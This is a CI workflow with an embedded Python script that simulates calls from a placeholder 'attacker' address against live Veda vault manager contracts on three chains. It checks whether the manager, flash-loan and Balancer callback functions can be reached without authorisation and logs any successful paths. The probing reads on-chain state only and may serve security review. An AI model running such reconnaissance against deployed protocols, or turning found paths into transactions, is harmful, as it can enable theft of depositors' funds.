name: veda-manager-flashloan-identity

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable
      - name: Verify manager self-root and Balancer callback reachability
        shell: bash
        run: |
          python3 - <<'PY'
          import json, subprocess, time, urllib.request, traceback

          ATTACKER="0x1111111111111111111111111111111111111111"
          CHAINS={
            "ethereum":{"id":1,"rpcs":["https://ethereum-rpc.publicnode.com","https://eth.drpc.org","https://rpc.mevblocker.io"],"products":{
              "liquidBTC":{"vault":"0x5f46d540b6eD704C3c8789105F30E075AA900726","manager":"0xaFa8c08bedB2eC1bbEb64A7fFa44c604e7cca68d","authority":"0x49F954c67ff235034b69b8a59fbe309A40256c8d"},
              "liquidETH":{"vault":"0xf0bb20865277aBd641a307eCe5Ee04E79073416C","manager":"0xf9f7969C357ce6dfd7973098Ea0D57173592bCCa","authority":"0x485Bde66Bb668a51f2372E34e45B1c6226798122"},
              "liquidUSD":{"vault":"0x08c6F91e2B681FaF5e17227F2a44C307b3C1364C","manager":"0x7b57Ad1A0AA89583130aCfAD024241170D24C13C","authority":"0xaba6ba1e95e0926a6a6b917fe4e2f19ceae4ff2e"},
            }},
            "scroll":{"id":534352,"rpcs":["https://scroll-rpc.publicnode.com","https://rpc.scroll.io","https://scroll.drpc.org"],"products":{
              "liquidBTC":{"vault":"0x5f46d540b6eD704C3c8789105F30E075AA900726","manager":"0xaFa8c08bedB2eC1bbEb64A7fFa44c604e7cca68d","authority":"0x49F954c67ff235034b69b8a59fbe309A40256c8d"},
              "liquidETH":{"vault":"0xf0bb20865277aBd641a307eCe5Ee04E79073416C","manager":"0x227975088C28DBBb4b421c6d96781a53578f19a8","authority":"0x485Bde66Bb668a51f2372E34e45B1c6226798122"},
              "liquidUSD":{"vault":"0x08c6F91e2B681FaF5e17227F2a44C307b3C1364C","manager":"0x7b57Ad1A0AA89583130aCfAD024241170D24C13C","authority":"0xaba6ba1e95e0926a6a6b917fe4e2f19ceae4ff2e"},
            }},
            "ink":{"id":57073,"rpcs":["https://rpc-gel.inkonchain.com","https://rpc-qnd.inkonchain.com","https://ink.drpc.org"],"products":{
              "balanced":{"vault":"0xcaae49fb7f74cCFBE8A05E6104b01c097a78789f","manager":"0xA0e501F98A1B5d3d8e6Ffd161c76f92570E42931","authority":"0x3E8B0ee1D05267fE9F8d2b1f8CB48F2e23d69c6B"},
              "boosted":{"vault":"0xDbD87325D7b1189Dcc9255c4926076fF4a96A271","manager":"0xEd23B12e7700bEB638562A22eD65f74291901C25","authority":"0x1F53135155d6fF516bCcfDd9424fcdB8AD1eFB77"},
            }},
          }
          def rpc(ep,m,p,t=35):
            b=json.dumps({"jsonrpc":"2.0","id":1,"method":m,"params":p}).encode();q=urllib.request.Request(ep,data=b,method="POST",headers={"content-type":"application/json","user-agent":"veda-manager-flashloan/1.0"})
            with urllib.request.urlopen(q,timeout=t) as r:o=json.loads(r.read().decode())
            if "error" in o:raise RuntimeError(o["error"])
            return o["result"]
          def choose(c):
            bad={}
            for ep in c["rpcs"]:
              try:
                if int(rpc(ep,"eth_chainId",[]),16)==c["id"]:return ep,bad
              except Exception as e:bad[ep]=repr(e)
            raise RuntimeError(bad)
          def run(*a):
            p=subprocess.run([str(x) for x in a],text=True,capture_output=True);return {"ok":p.returncode==0,"stdout":p.stdout.strip(),"stderr":p.stderr.strip(),"returncode":p.returncode}
          def sig(s):return run("cast","sig",s)["stdout"].lower()
          def calldata(s,*a):return run("cast","calldata",s,*a)["stdout"]
          def st(x):return x[2:] if str(x).startswith("0x") else str(x)
          def aw(a):return st(a).lower().rjust(64,"0")
          def sw(s):return st(s).lower().ljust(64,"0")
          def addr(x):return "0x"+st(x)[-40:].lower()
          def uint(x):return int(x,16) if x and x!="0x" else 0
          def boolean(x):return bool(uint(x))
          S={"authority":sig("authority()"),"vault":sig("vault()"),"balancer":sig("balancerVault()"),"root":sig("manageRoot(address)"),"paused":sig("isPaused()"),"manage":sig("manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])"),"flashLoan":sig("flashLoan(address,address[],uint256[],bytes)"),"receiveFlashLoan":sig("receiveFlashLoan(address[],uint256[],uint256[],bytes)"),"canCall":sig("canCall(address,address,bytes4)"),"public":sig("isCapabilityPublic(address,bytes4)")}
          def call(ep,to,data,frm=None):
            tx={"to":to,"data":data}
            if frm:tx["from"]=frm
            return rpc(ep,"eth_call",[tx,"latest"])
          def safe(ep,to,data,frm=None):
            try:return {"ok":True,"raw":call(ep,to,data,frm)}
            except Exception as e:return {"ok":False,"error":repr(e)}
          def gate(ep,auth,caller,target,sel):return {"canCall":boolean(call(ep,auth,S["canCall"]+aw(caller)+aw(target)+sw(sel))),"public":boolean(call(ep,auth,S["public"]+aw(target)+sw(sel)))}
          out={"generated_at_unix":int(time.time()),"chains":{},"candidate_paths":[],"errors":[]}
          empty_manage=calldata("manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])","[]","[]","[]","[]","[]")
          direct_receive=calldata("receiveFlashLoan(address[],uint256[],uint256[],bytes)","[]","[]","[]","0x")
          for cname,c in CHAINS.items():
            ep,bad=choose(c);block=int(rpc(ep,"eth_blockNumber",[]),16);cd={"endpoint":ep,"rpc_failures":bad,"block":block,"products":{}};out["chains"][cname]=cd
            for pname,p in c["products"].items():
              row={"addresses":p,"roots":{},"gates":{},"probes":{}}
              try:
                code=rpc(ep,"eth_getCode",[p["manager"],"latest"]);row["code_bytes"]=len(st(code))//2
                row["manager_authority"]=addr(call(ep,p["manager"],S["authority"]));row["manager_vault"]=addr(call(ep,p["manager"],S["vault"]));row["balancer_vault"]=addr(call(ep,p["manager"],S["balancer"]));row["paused"]=boolean(call(ep,p["manager"],S["paused"]))
                for label,who in [("attacker",ATTACKER),("manager",p["manager"]),("vault",p["vault"]),("balancer",row["balancer_vault"])]:row["roots"][label]=call(ep,p["manager"],S["root"]+aw(who))
                for label,caller,sel in [("attacker_manage",ATTACKER,S["manage"]),("manager_manage",p["manager"],S["manage"]),("vault_manage",p["vault"],S["manage"]),("attacker_flashLoan",ATTACKER,S["flashLoan"]),("vault_flashLoan",p["vault"],S["flashLoan"])]:
                  try:row["gates"][label]=gate(ep,p["authority"],caller,p["manager"],sel)
                  except Exception as e:row["gates"][label]={"error":repr(e)}
                row["probes"]["attacker_manage_empty"]=safe(ep,p["manager"],empty_manage,ATTACKER)
                row["probes"]["attacker_flashLoan_empty"]=safe(ep,p["manager"],calldata("flashLoan(address,address[],uint256[],bytes)",p["manager"],"[]","[]","0x"),ATTACKER)
                row["probes"]["attacker_receive_direct"]=safe(ep,p["manager"],direct_receive,ATTACKER)
                # Ask the configured Balancer vault to call this manager outside an in-progress manager.flashLoan.
                balancer_call=calldata("flashLoan(address,address[],uint256[],bytes)",p["manager"],"[]","[]","0x")
                row["probes"]["attacker_via_balancer_zero_loan"]=safe(ep,row["balancer_vault"],balancer_call,ATTACKER)
                if any(x.get("ok") for x in row["probes"].values()):out["candidate_paths"].append({"chain":cname,"product":pname,"successful_probes":[k for k,v in row["probes"].items() if v.get("ok")],"row":row})
              except Exception as e:
                row["error"]=repr(e);row["traceback"]=traceback.format_exc();out["errors"].append({"chain":cname,"product":pname,"error":repr(e)})
              cd["products"][pname]=row
          with open("veda-manager-flashloan-identity.json","w",encoding="utf-8") as f:json.dump(out,f,indent=2,sort_keys=True);f.write("\n")
          print(json.dumps({"candidate_paths":out["candidate_paths"],"errors":out["errors"],"chains":{c:{p:{"balancer":r.get("balancer_vault"),"roots":r.get("roots"),"gates":r.get("gates"),"probes":{k:v.get("ok") for k,v in r.get("probes",{}).items()}} for p,r in d["products"].items()} for c,d in out["chains"].items()}},indent=2,sort_keys=True))
          PY
      - name: Upload manager flash-loan identity proof
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: veda-manager-flashloan-identity
          path: veda-manager-flashloan-identity.json
          if-no-files-found: error
          retention-days: 1
